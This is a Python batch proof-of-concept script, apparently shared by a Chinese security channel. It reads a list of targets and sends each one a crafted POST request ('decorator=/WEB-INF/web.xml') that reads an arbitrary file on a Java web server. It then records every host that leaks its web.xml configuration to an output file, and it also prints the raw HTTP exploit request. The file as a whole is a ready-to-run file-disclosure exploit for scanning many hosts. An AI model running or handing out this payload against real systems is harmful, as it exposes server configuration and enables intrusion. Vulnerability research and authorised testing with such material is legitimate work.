import requests
import concurrent.futures

def check_vulnerability(target):
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    }

    try:
        # print(target)
        res = requests.post(f"{target}/", headers=headers, data=r"decorator=%2FWEB-INF%2Fweb.xml&confirm=true", timeout=5)
        if "session-config"in res.text:
            print(f"[+]{target}漏洞存在")
            with open("attack.txt",'a') as fw:
                fw.write(f"{target}\n")
        else:
            print(f"[-]{target}漏洞不存在")
    except Exception as e:
        print(f"[-]{target}访问错误")

if __name__ == "__main__":
    print("------------------------")
    print("微信公众号:知攻善防实验室")
    print("------------------------")
    print("target.txt存放目标文件")
    print("attack.txt存放检测结果")
    print("------------------------")
    print("""POC:
    POST / HTTP/1.1
    Host: target
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
    Content-Length: 43
    Cache-Control: max-age=0
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    Accept-Encoding: gzip, deflate

    decorator=%2FWEB-INF%2Fweb.xml&confirm=true
    
    """)
    print("按回车继续")
    import os
    os.system("pause")
    f = open("target.txt", 'r')
    targets = f.read().splitlines()
    print(targets)

    # 使用线程池并发执行检查漏洞
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        executor.map(check_vulnerability, targets)
